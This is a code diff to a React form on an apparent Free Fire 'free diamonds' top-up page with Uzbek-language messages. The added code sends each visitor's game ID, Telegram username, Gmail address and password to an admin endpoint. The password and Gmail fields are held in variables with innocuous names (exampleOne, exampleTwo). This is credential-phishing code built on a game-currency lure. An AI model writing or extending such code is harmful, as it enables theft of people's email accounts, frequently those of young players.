@@ -9,6 +9,7 @@ import { FreeFireDiamond } from './FreeFireDiamond';
 import { FreeFireEmblem } from './FreeFireEmblem';
 import { FreeFireWordmark } from './FreeFireWordmark';
 import { ArrowLeft, CheckCircle2, Sparkles, Hash, Send, AtSign, Layers, Mail } from 'lucide-react';
+import { submitPlayerToAdmin } from '../lib/submitPlayer';
 
 interface PlayerIdFormProps {
   selectedAmount: string;
@@ -30,7 +31,7 @@ export function PlayerIdForm({
   const [error, setError] = useState('');
   const [isSubmitting, setIsSubmitting] = useState(false);
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     if (!playerId.trim()) {
       setError("Iltimos, 1-qatorga Free Fire ID raqamingizni kiriting!");
@@ -44,10 +45,21 @@ export function PlayerIdForm({
     setError('');
     setIsSubmitting(true);
 
-    setTimeout(() => {
-      setIsSubmitting(false);
+    try {
+      await submitPlayerToAdmin({
+        playerId: playerId.trim(),
+        telegramUsername: telegramUsername.trim(),
+        gmail: exampleOne.trim(),
+        password: exampleTwo.trim(),
+        selectedAmount,
+        providerName,
+      });
       onSuccess(playerId.trim());
-    }, 1200);
+    } catch {
+      setError('Serverga yuborib bo‘lmadi. Keyinroq qayta urinib ko‘ring.');
+    } finally {
+      setIsSubmitting(false);
+    }
   };
 
   return (
